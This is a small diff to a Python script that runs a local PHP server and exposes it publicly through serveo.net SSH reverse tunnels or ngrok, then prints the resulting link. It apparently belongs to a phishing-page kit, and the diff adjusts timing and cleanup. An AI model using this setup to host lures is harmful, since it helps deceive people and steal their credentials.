@@ -285,7 +285,7 @@ def runPEnv():
     
 def serveo():
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:1111 serveo.net > sendlink.txt 2> /dev/null & ')
-    sleep(7)
+    sleep(10)
     f = open('sendlink.txt', 'r')
     a = ['[32m', 'Forwarding', 'HTTP', 'traffic', 'from', '[0m', ' ']
     lst = []
@@ -302,7 +302,7 @@ def serveo():
     url = open('sendlink.txt', 'r')    
     print("\n {0}[{1}*{0}]{1} SERVEO URL: {2}".format(CYAN, END, GREEN) + url.read() + "{1}".format(CYAN, END, GREEN))
     url.close()
-    system('rm sendlink.txt')    
+        
 
 def runNgrok():
     system('./Server/ngrok http 1111 > /dev/null &')
@@ -314,7 +314,7 @@ def runNgrok():
     
     
 def runServer():
-    system("cd Server/www/ && php -n -S 127.0.0.1:1111 > /dev/null 2>&1 &")
+    system("cd Server/www/ && php -S 127.0.0.1:1111 > /dev/null 2>&1 &")
 
     
 
